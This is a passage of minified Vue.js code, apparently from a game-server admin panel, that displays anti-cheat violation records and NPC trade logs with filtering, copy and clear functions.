0!==(l=Object(A.cloneDeep)(t.violationsListFilter)).timestampStart&&void 0!==l.timestampEnd&&(l.timestampStart=R()(l.timestampStart).valueOf(),l.timestampEnd=R()(l.timestampEnd).valueOf()),o=Object(s.a)({pageNum:n,pageSize:r},l)),t.loadingViolationsListTable=!0,i.prev=3,i.next=6,f({method:"GET",url:"/violationsRecordAdminSys/list",params:o});case 6:c=i.sent,t.loadingViolationsListTable=!1,200===c.status&&(t.violationsListPagination.total=c.data.count,t.violationsListData=c.data.list),t.selectedRowKeys=[],i.next=16;break;case 12:i.prev=12,i.t0=i.catch(3),console.error(i.t0),t.loadingViolationsListTable=!1;case 16:case"end":return i.stop()}}),i,null,[[3,12]])})))()},doCopyCommands:function(e){var t=this;this.$copyText(e).then((function(e){t.$message.success("已复制到剪贴板")}),(function(e){t.$message.error("复制失败"),console.log("复制失败：",e)}))},doCopyCommandsMulti:function(){var e=this,t=this.violationsListData.filter((function(t){return e.selectedRowKeys.includes(t.id)})).map((function(e){return e.rawContent})).filter((function(e){var t;return(null==e||null===(t=e.trim())||void 0===t?void 0:t.length)>0})).join("\n");this.$copyText(t).then((function(t){e.$message.success("已复制到剪贴板")}),(function(t){e.$message.error("复制失败"),console.log("复制失败：",t)}))},cleanViolationsRecord:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.prev=0,e.cleanLoading=!0,t.next=4,f({method:"DELETE",url:"/violationsRecordAdminSys/clean"});case 4:200===t.sent.status&&(e.cleanLoading=!1,e.$message.success("操作成功"),e.getViolationsList()),t.next=12;break;case 8:t.prev=8,t.t0=t.catch(0),e.cleanLoading=!1,console.error(t.t0);case 12:case"end":return t.stop()}}),t,null,[[0,8]])})))()}}},ji=Hi,Yi=Object(S.a)(ji,(function(){var e=this,t=e.$createElement,i=e._self._c||t;return i("div",{staticStyle:{width:"100%",height:"100%"}},[i("a-page-header",{staticStyle:{border:"1px solid rgb(235, 237, 240)"},attrs:{title:"违规记录列表"}},[e.userInfo&&"sysAdmin"===e.userInfo.role?i("template",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"},slot:"extra"},[i("a-popconfirm",{attrs:{placement:"right",title:"确定要清空违规记录列表吗"},on:{confirm:e.cleanViolationsRecord}},[i("a-button",{attrs:{size:"small",icon:"delete",type:"danger",loading:e.cleanLoading}},[e._v("清空违规记录")])],1)],1):e._e()],2),i("div",{staticStyle:{width:"100%",height:"calc(100% - 66px)",padding:"15px","padding-top":"0"}},[i("div",{staticStyle:{width:"100%",height:"100%",background:"white","overflow-y":"auto",padding:"10px"}},[i("a-collapse",{staticStyle:{background:"none"},attrs:{"default-active-key":"1",bordered:!1}},[i("a-collapse-panel",{key:"1",staticStyle:{border:"none"}},[i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"},attrs:{slot:"header"},slot:"header"},[i("span",[e._v("搜索过滤条件")]),i("a-button",{staticStyle:{float:"right"},attrs:{size:"small",type:"primary",icon:"filter"},nativeOn:{click:function(t){return t.stopPropagation(),e.onViolationsListFilter.apply(null,arguments)}}},[e._v("过滤")]),i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small"},nativeOn:{click:function(t){return t.stopPropagation(),e.onViolationsListCleanFilter.apply(null,arguments)}}},[e._v("清空过滤 / 刷新")]),e.selectedRowKeys.length>0?i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small",icon:"copy"},on:{click:function(){return e.doCopyCommandsMulti()}}},[e._v("全部复制到剪贴板")]):e._e()],1),i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block"}},[e._v("违规类型标记:")]),i("a-select",{staticStyle:{width:"270px","margin-left":"10px"},attrs:{allowClear:""},model:{value:e.violationsListFilter.tag,callback:function(t){e.$set(e.violationsListFilter,"tag",t)},expression:"violationsListFilter.tag"}},e._l(e.tagList,(function(t){return i("a-select-option",{key:t.value,attrs:{title:t.label}},[i("a-tooltip",{attrs:{title:t.label}},[e._v(e._s(t.label))])],1)})),1),i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("Steam ID:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.violationsListFilter.steamId,callback:function(t){e.$set(e.violationsListFilter,"steamId",t)},expression:"violationsListFilter.steamId"}}),i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("日志原文:")]),i("a-input",{staticStyle:{width:"250px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.violationsListFilter.rawContent,callback:function(t){e.$set(e.violationsListFilter,"rawContent",t)},expression:"violationsListFilter.rawContent"}})],1),i("div",{staticStyle:{"margin-top":"10px","overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block"}},[e._v("记录时间:")]),i("a-range-picker",{staticStyle:{width:"320px","margin-left":"10px"},attrs:{"show-time":{format:"HH:mm:ss"},format:"YYYY-MM-DD HH:mm:ss",value:[e.violationsListFilter.timestampStart,e.violationsListFilter.timestampEnd],allowClear:""},on:{change:function(t){e.$set(e.violationsListFilter,"timestampStart",t[0]),e.$set(e.violationsListFilter,"timestampEnd",t[1])}}})],1)])],1),i("div",{staticStyle:{"margin-bottom":"10px"}},[i("a-tag",{attrs:{color:"green"}},[e._v("绿色标签")]),e._v("- 正常日志 "),i("a-tag",{staticStyle:{"margin-left":"10px"},attrs:{color:"orange"}},[e._v("橙色标签")]),e._v("- 疑似使用外挂 "),i("a-tag",{staticStyle:{"margin-left":"10px"},attrs:{color:"red"}},[e._v("红色标签")]),e._v("- 大概率使用外挂 ")],1),i("a-table",{staticStyle:{"margin-top":"10px"},attrs:{columns:e.violationsListColumns,"data-source":e.violationsListData,expandedRowKeys:e.expandedViolationsIds,"row-key":"id",pagination:!1,loading:e.loadingViolationsListTable,bordered:"",scroll:{x:"100%"},size:"small","row-selection":{selectedRowKeys:e.selectedRowKeys,onChange:function(t){e.selectedRowKeys=t}}},on:{expand:function(t,i){if(t)void 0===e.expandedViolationsIds.find((function(e){return e===i.id}))&&e.expandedViolationsIds.push(i.id);else{var a=Object.keys(e.expandedViolationsIds).find((function(t){return e.expandedViolationsIds[t]===i.id}));void 0!==a&&e.expandedViolationsIds.splice(a,1)}}},scopedSlots:e._u([{key:"tag",fn:function(t){return[i("a-tag",{attrs:{color:void 0!==e.tagList.find((function(e){return e.value===t}))?e.tagList.find((function(e){return e.value===t})).color:"grey"}},[e._v(" "+e._s(void 0!==e.tagList.find((function(e){return e.value===t}))?e.tagList.find((function(e){return e.value===t})).label:"未标记类型")+" ")])]}},{key:"steamId",fn:function(t){return[i("span",[e._v(e._s(t))])]}},{key:"rawContent",fn:function(t,a){return[i("div",{staticStyle:{"text-overflow":"ellipsis","overflow-x":"hidden","white-space":"nowrap"},style:{cursor:void 0===e.expandedViolationsIds.find((function(e){return e===a.id}))?"pointer":"auto"},attrs:{title:void 0===e.expandedViolationsIds.find((function(e){return e===a.id}))?t+"\n【点击展开】":t},on:{click:function(t){void 0===e.expandedViolationsIds.find((function(e){return e===a.id}))&&e.expandedViolationsIds.push(a.id)}}},[e._v(" "+e._s(t)+" ")])]}},{key:"createdTimeStamp",fn:function(t){return[i("span",[e._v(e._s(t?e.moment(parseInt(t)).format("YYYY-MM-DD HH:mm:ss"):"-"))])]}},{key:"expandedRowRender",fn:function(t){return i("div",{staticStyle:{margin:"0"}},[e.expandedViolationsIds.find((function(e){return e===t.id}))?["string"==typeof t.rawContent?[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"calc(100% - 135px)",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("日志原文")]),i("div",{staticStyle:{width:"125px",height:"24px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[i("a-button",{attrs:{size:"small",icon:"copy"},on:{click:function(){return e.doCopyCommands(t.rawContent)}}},[e._v("复制到剪贴板")])],1)]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("pre",{staticStyle:{width:"100%",height:"auto","padding-left":"10px"},domProps:{innerHTML:e._s(t.rawContent.replace(/\n/g,"\\n<br>").replace(/\r/g,"\\r<br>"))}})]:e._e(),i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("坐标信息详情")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px"}},[i("span",[e._v("类型标记:")]),i("span",{staticStyle:{"margin-left":"10px"}},[i("span",{style:{color:void 0!==e.tagList.find((function(e){return e.value===t.tag}))?e.tagList.find((function(e){return e.value===t.tag})).color:"grey"}},[e._v(e._s(void 0!==e.tagList.find((function(e){return e.value===t.tag}))?e.tagList.find((function(e){return e.value===t.tag})).label:"未标记类型"))]),i("span",[e._v(" ("+e._s(t.tag)+")")])])]),i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px"}},[i("span",[e._v("违规解读:")]),i("span",{staticStyle:{"margin-left":"10px"}},[e._v(e._s(void 0!==e.tagList.find((function(e){return e.value===t.tag}))&&e.tagList.find((function(e){return e.value===t.tag})).desc?e.tagList.find((function(e){return e.value===t.tag})).desc:"暂无"))])]),t.otherConfig&&"illegalLockpick"===t.tag?[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("撬锁违规详情")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),t.otherConfig&&t.otherConfig.owner&&t.otherConfig.owner.scumId?i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px"}},[i("span",[e._v("物主信息:")]),i("strong",{staticStyle:{color:"#1890ff","margin-left":"10px"}},[e._v(e._s(t.otherConfig.owner.scumId))]),i("span",{staticStyle:{"margin-left":"5px"}},[e._v("("+e._s(t.otherConfig.owner.steamId||"无Steam ID")+")")])]):e._e(),t.otherConfig&&t.otherConfig.targetName?i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px"}},[i("span",[e._v("物品信息:")]),i("strong",{staticStyle:{color:"#1890ff","margin-left":"10px"}},[e._v(e._s(t.otherConfig.targetName||""))])]):e._e(),t.otherConfig&&t.otherConfig.lockType?i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px"}},[i("span",[e._v("锁类型:")]),i("a-tag",{staticStyle:{"margin-left":"10px"},attrs:{color:void 0!==e.lockTypeList.find((function(e){return e.value===t.otherConfig.lockType}))?e.lockTypeList.find((function(e){return e.value===t.otherConfig.lockType})).color:"grey"}},[e._v(" "+e._s(void 0!==e.lockTypeList.find((function(e){return e.value===t.otherConfig.lockType}))?e.lockTypeList.find((function(e){return e.value===t.otherConfig.lockType})).label:t.otherConfig.lockType)+" ")])],1):e._e()]:e._e(),t.otherConfig&&void 0!==t.otherConfig.locations&&void 0!==t.otherConfig.area?[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("坐标信息详情")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px"}},[i("span",[e._v("涉事坐标(区域):")]),i("span",{staticStyle:{"margin-left":"10px"}},[e._v(e._s(t.otherConfig.locations)),i("strong",{staticStyle:{"margin-left":"5px"}},[e._v("("+e._s(t.otherConfig.area)+")")])])]),i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("地图标识")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{height:"150px",width:"180px","padding-left":"10px"}},[i("map-locations",{attrs:{width:180,height:150,locations:t.otherConfig.locations}})],1)]:e._e(),t.otherConfig&&void 0!==t.otherConfig.clientLocations&&void 0!==t.otherConfig.clientArea&&void 0!==t.otherConfig.serverLocations&&void 0!==t.otherConfig.serverArea?[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("坐标信息详情")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px"}},[i("span",[e._v("涉事客户端坐标(区域):")]),i("span",{staticStyle:{"margin-left":"10px"}},[e._v(e._s(t.otherConfig.clientLocations)),i("strong",{staticStyle:{"margin-left":"5px"}},[e._v("("+e._s(t.otherConfig.clientArea)+")")])])]),i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px"}},[i("span",[e._v("涉事服务端坐标(区域):")]),i("span",{staticStyle:{"margin-left":"10px"}},[e._v(e._s(t.otherConfig.serverLocations)),i("strong",{staticStyle:{"margin-left":"5px"}},[e._v("("+e._s(t.otherConfig.serverArea)+")")])])]),i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("客户端地图标识")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{height:"150px",width:"180px","padding-left":"10px"}},[i("map-locations",{attrs:{width:180,height:150,locations:t.otherConfig.clientLocations}})],1),i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("服务端地图标识")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{height:"150px",width:"180px","padding-left":"10px"}},[i("map-locations",{attrs:{width:180,height:150,locations:t.otherConfig.serverLocations}})],1)]:e._e()]:e._e()],2)}}])}),i("a-pagination",{staticStyle:{"margin-top":"10px"},attrs:{"show-size-changer":"","page-size":e.violationsListPagination.pageSize,current:e.violationsListPagination.pageNum,total:e.violationsListPagination.total},on:{change:e.onChangeViolationsListPagination,showSizeChange:e.onShowSizeChangeViolationsListPagination}})],1)])],1)}),[],!1,null,"841f5328",null),Gi=Yi.exports,Ki={name:"Economy",components:{},computed:Object(s.a)({},Object(v.mapState)(["userInfo"])),data:function(){return{moment:R.a,cleanLoading:!1,loadingEconomyListTable:!1,economyListFilter:{steamId:void 0,scumId:void 0,trader:void 0,timestampStart:void 0,timestampEnd:void 0},economyListColumns:[{title:"操作人Steam ID",key:"steamId",dataIndex:"steamId",width:150,align:"center",scopedSlots:{customRender:"steamId"}},{title:"操作人游戏名称",key:"scumId",dataIndex:"scumId",width:180,align:"center",scopedSlots:{customRender:"scumId"}},{title:"操作类型",key:"type",dataIndex:"type",width:80,align:"center",scopedSlots:{customRender:"type"}},{title:"交易员信息",key:"trader",dataIndex:"trader",width:100,align:"center",scopedSlots:{customRender:"trader"}},{title:"交易前资产",key:"before",dataIndex:"before",width:190,align:"center",scopedSlots:{customRender:"before"}},{title:"交易后资产",key:"after",dataIndex:"after",width:190,align:"center",scopedSlots:{customRender:"after"}},{title:"当前在线用户数",key:"effectiveUsersOnline",dataIndex:"effectiveUsersOnline",width:120,align:"center",scopedSlots:{customRender:"effectiveUsersOnline"}},{title:"生成记录时间",key:"createdTimeStamp",dataIndex:"createdTimeStamp",width:150,align:"center",scopedSlots:{customRender:"createdTimeStamp"}}],economyNpcPurcahseListColumns:[{title:"物品名称",key:"item",dataIndex:"item",width:150,align:"center",scopedSlots:{customRender:"item"}},{title:"数量",key:"count",dataIndex:"count",width:80,align:"center",scopedSlots:{customRender:"count"}},{title:"价格",key:"price",dataIndex:"price",width:100,align:"center",scopedSlots:{customRender:"price"}},{title:"交易前数量",key:"oldAmount",dataIndex:"oldAmount",width:80,align:"center",scopedSlots:{customRender:"oldAmount"}},{title:"交易后数量",key:"newAmount",dataIndex:"newAmount",width:80,align:"center",scopedSlots:{customRender:"newAmount"}}],economyNpcSellListColumns:[{title:"物品名称",key:"item",dataIndex:"item",width:150,align:"center",scopedSlots:{customRender:"item"}},{title:"数量",key:"count",dataIndex:"count",width:80,align:"center",scopedSlots:{customRender:"count"}},{title:"总价",key:"totalPrice",dataIndex:"totalPrice",width:100,align:"center",scopedSlots:{customRender:"totalPrice"}},{title:"物品价格",key:"itemPrice",dataIndex:"itemPrice",width:100,align:"center",scopedSlots:{customRender:"itemPrice"}},{title:"手续费",key:"originalPrice",dataIndex:"originalPrice",width:100,align:"center",scopedSlots:{customRender:"originalPrice"}},{title:"交易前数量",key:"oldAmount",dataIndex:"oldAmount",width:80,align:"center",scopedSlots:{customRender:"oldAmount"}},{title:"交易后数量",key:"newAmount",dataIndex:"newAmount",width:80,align:"center",scopedSlots:{customRender:"newAmount"}}],economyListData:[],economyListPagination:{pageSize:20,pageNum:1,total:0},expandedEconomyIds:[],typeList:[{value:"npcPurchase",label:"购买",color:"green"},{value:"npcSell",label:"卖出",color:"red"}],selectedRowKeys:[]}},mounted:function(){this.getEconomyList()},methods:{onEconomyListCleanFilter:function(){var e=this;this.economyListPagination.pageNum=1,this.$nextTick((function(){e.getEconomyList(!0)}))},onEconomyListFilter:function(){var e=this;this.economyListPagination.pageNum=1,this.$nextTick((function(){e.getEconomyList()}))},onChangeEconomyListPagination:function(e){var t=this;this.economyListPagination.pageNum=e,this.$nextTick((function(){t.getEconomyList()}))},onShowSizeChangeEconomyListPagination:function(e,t){var i=this;this.economyListPagination.pageNum=1,this.economyListPagination.pageSize=t,this.$nextTick((function(){i.getEconomyList()}))},getEconomyList:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a,n,r,o,l,c;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return a=t.economyListPagination,n=a.pageNum,r=a.pageSize,e?(t.economyListFilter={steamId:void 0,scumId:void 0,trader:void 0,timestampStart:void 0,timestampEnd:void 0},o={pageNum:n,pageSize:r,type:"npc"}):(void 0!==(l=Object(A.cloneDeep)(t.economyListFilter)).timestampStart&&void 0!==l.timestampEnd&&(l.timestampStart=R()(l.timestampStart).valueOf(),l.timestampEnd=R()(l.timestampEnd).valueOf()),o=Object(s.a)({pageNum:n,pageSize:r,type:"npc"},l)),t.loadingEconomyListTable=!0,i.prev=3,i.next=6,f({method:"GET",url:"/economyAdminSys/list",params:o});case 6:c=i.sent,t.loadingEconomyListTable=!1,200===c.status&&(t.economyListPagination.total=c.data.count,t.economyListData=c.data.list),t.selectedRowKeys=[],i.next=16;break;case 12:i.prev=12,i.t0=i.catch(3),console.error(i.t0),t.loadingEconomyListTable=!1;case 16:case"end":return i.stop()}}),i,null,[[3,12]])})))()},doCopyCommands:function(e){var t=this;this.$copyText(e).then((function(e){t.$message.success("已复制到剪贴板")}),(function(e){t.$message.error("复制失败"),console.log("复制失败：",e)}))},doCopyCommandsMulti:function(){var e=this,t=this.economyListData.filter((function(t){return e.selectedRowKeys.includes(t.id)})).map((function(e){return e.rawText})).filter((function(e){var t;return(null==e||null===(t=e.trim())||void 0===t?void 0:t.length)>0})).join("\n");this.$copyText(t).then((function(t){e.$message.success("已复制到剪贴板")}),(function(t){e.$message.error("复制失败"),console.log("复制失败：",t)}))},cleanEconomyRecord:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.prev=0,e.cleanLoading=!0,t.next=4,f({method:"DELETE",url:"/economyAdminSys/clean"});case 4:200===t.sent.status&&(e.cleanLoading=!1,e.$message.success("操作成功"),e.getEconomyList()),t.next=12;break;case 8:t.prev=8,t.t0=t.catch(0),e.cleanLoading=!1,console.error(t.t0);case 12:case"end":return t.stop()}}),t,null,[[0,8]])})))()}}},Vi=Ki,Xi=Object(S.a)(Vi,(function(){var e=this,t=e.$createElement,i=e._self._c||t;return i("div",{staticStyle:{width:"100%",height:"100%"}},[i("a-page-header",{staticStyle:{border:"1px solid rgb(235, 237, 240)"},attrs:{title:"NPC交易记录列表"}},[e.userInfo&&"sysAdmin"===e.userInfo.role?i("template",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"},slot:"extra"},[i("a-popconfirm",{attrs:{placement:"right",title:"确定要清空NPC交易记录列表吗"},on:{confirm:e.cleanEconomyRecord}},[i("a-button",{attrs:{size:"small",icon:"delete",type:"danger",loading:e.cleanLoading}},[e._v("清空违规记录")])],1)],1):e._e()],2),i("div",{staticStyle:{width:"100%",height:"calc(100% - 66px)",padding:"15px","padding-top":"0"}},[i("div",{staticStyle:{width:"100%",height:"100%",background:"white","overflow-y":"auto",padding:"10px"}},[i("a-collapse",{staticStyle:{background:"none"},attrs:{"default-active-key":"1",bordered:!1}},[i("a-collapse-panel",{key:"1",staticStyle:{border:"none"}},[i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"},attrs:{slot:"header"},slot:"header"},[i("span",[e._v("搜索过滤条件")]),i("a-button",{staticStyle:{float:"right"},attrs:{size:"small",type:"primary",icon:"filter"},nativeOn:{click:function(t){return t.stopPropagation(),e.onEconomyListFilter.apply(null,arguments)}}},[e._v("过滤")]),i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small"},nativeOn:{click:function(t){return t.stopPropagation(),e.onEconomyListCleanFilter.apply(null,arguments)}}},[e._v("清空过滤 / 刷新")]),e.selectedRowKeys.length>0?i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small",icon:"copy"},on:{click:function(){return e.doCopyCommandsMulti()}}},[e._v("全部复制到剪贴板")]):e._e()],1),i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block"}},[e._v("操作者Steam ID:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.economyListFilter.steamId,callback:function(t){e.$set(e.economyListFilter,"steamId",t)},expression:"economyListFilter.steamId"}}),i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("操作者游戏名称:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.economyListFilter.scumId,callback:function(t){e.$set(e.economyListFilter,"scumId",t)},expression:"economyListFilter.scumId"}})],1),i("div",{staticStyle:{"margin-top":"10px","overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block"}},[e._v("交易员:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.economyListFilter.trader,callback:function(t){e.$set(e.economyListFilter,"trader",t)},expression:"economyListFilter.trader"}}),i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("记录时间:")]),i("a-range-picker",{staticStyle:{width:"320px","margin-left":"10px"},attrs:{"show-time":{format:"HH:mm:ss"},format:"YYYY-MM-DD HH:mm:ss",value:[e.economyListFilter.timestampStart,e.economyListFilter.timestampEnd],allowClear:""},on:{change:function(t){e.$set(e.economyListFilter,"timestampStart",t[0]),e.$set(e.economyListFilter,"timestampEnd",t[1])}}})],1)])],1),i("a-table",{staticStyle:{"margin-top":"10px"},attrs:{columns:e.economyListColumns,"data-source":e.economyListData,expandedRowKeys:e.expandedEconomyIds,"row-key":"id",pagination:!1,loading:e.loadingEconomyListTable,bordered:"",scroll:{x:"100%"},size:"small","row-selection":{selectedRowKeys:e.selectedRowKeys,onChange:function(t){e.selectedRowKeys=t}}},on:{expand:function(t,i){if(t)void 0===e.expandedEconomyIds.find((function(e){return e===i.id}))&&e.expandedEconomyIds.push(i.id);else{var a=Object.keys(e.expandedEconomyIds).find((function(t){return e.expandedEconomyIds[t]===i.id}));void 0!==a&&e.expandedEconomyIds.splice(a,1)}}},scopedSlots:e._u([{key:"steamId",fn:function(t){return[i("span",[e._v(e._s(t))])]}},{key:"scumId",fn:function(t,a){return[i("span",[e._v(e._s(t))]),a.actionsRecordUser&&a.actionsRecordUser.userName?i("span",{staticStyle:{color:"#1890ff",cursor:"pointer"},on:{click:function(){return e.$router.push({path:"/user",query:{userName:a.actionsRecordUser.userName}})}}},[e._v("("+e._s(a.actionsRecordUser.userName)+")")]):e._e()]}},{key:"type",fn:function(t,a){return[i("a-tag",{attrs:{color:void 0!==e.typeList.find((function(e){return e.value===a.type}))?e.typeList.find((function(e){return e.value===a.type})).color:"grey"}},[e._v(" "+e._s(void 0!==e.typeList.find((function(e){return e.value===a.type}))?e.typeList.find((function(e){return e.value===a.type})).label:a.type)+" ")])]}},{key:"before",fn:function(t,a){return[a.otherConfig&&a.otherConfig.before?[i("a-tooltip",{attrs:{title:"现金"}},[i("span",[i("a-icon",{staticStyle:{color:"#1890ff"},attrs:{type:"money-collect"}}),i("strong",{staticStyle:{color:"#1890ff"}},[e._v(e._s(a.otherConfig.before.cash))])],1)]),i("a-tooltip",{attrs:{title:"金条"}},[i("span",{staticStyle:{"margin-left":"5px"}},[i("a-icon",{staticStyle:{color:"gold"},attrs:{type:"gold"}}),i("strong",{staticStyle:{color:"gold"}},[e._v(e._s(a.otherConfig.before.gold))])],1)]),i("a-tooltip",{attrs:{title:"银行卡余额"}},[i("span",{staticStyle:{"margin-left":"5px"}},[i("a-icon",{staticStyle:{color:"#18900f"},attrs:{type:"credit-card"}}),i("strong",{staticStyle:{color:"#18900f"}},[e._v(e._s(a.otherConfig.before.bankAccountBalance))])],1)])]:e._e()]}},{key:"after",fn:function(t,a){return[a.otherConfig&&a.otherConfig.after?[i("a-tooltip",{attrs:{title:"现金"}},[i("span",[i("a-icon",{staticStyle:{color:"#1890ff"},attrs:{type:"money-collect"}}),i("strong",{staticStyle:{color:"#1890ff"}},[e._v(e._s(a.otherConfig.after.cash))])],1)]),i("a-tooltip",{attrs:{title:"金条"}},[i("span",{staticStyle:{"margin-left":"5px"}},[i("a-icon",{staticStyle:{color:"gold"},attrs:{type:"gold"}}),i("strong",{staticStyle:{color:"gold"}},[e._v(e._s(a.otherConfig.after.gold))])],1)]),i("a-tooltip",{attrs:{title:"银行卡余额"}},[i("span",{staticStyle:{"margin-left":"5px"}},[i("a-icon",{staticStyle:{color:"#18900f"},attrs:{type:"credit-card"}}),i("strong",{staticStyle:{color:"#18900f"}},[e._v(e._s(a.otherConfig.after.bankAccountBalance))])],1)])]:e._e()]}},{key:"effectiveUsersOnline",fn:function(t,a){return[a.otherConfig&&a.otherConfig.effectiveUsersOnline?[i("span",[e._v(e._s(a.otherConfig.effectiveUsersOnline))])]:e._e()]}},{key:"createdTimeStamp",fn:function(t){return[i("span",[e._v(e._s(t?e.moment(parseInt(t)).format("YYYY-MM-DD HH:mm:ss"):"-"))])]}},{key:"expandedRowRender",fn:function(t){return i("div",{staticStyle:{margin:"0"}},[e.expandedEconomyIds.find((function(e){return e===t.id}))?["string"==typeof t.rawText?[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"calc(100% - 135px)",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("日志原文")]),i("div",{staticStyle:{width:"125px",height:"24px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[i("a-button",{attrs:{size:"small",icon:"copy"},on:{click:function(){return e.doCopyCommands(t.rawText)}}},[e._v("复制到剪贴板")])],1)]),i("a-divider",{staticStyle:{margin:"5px 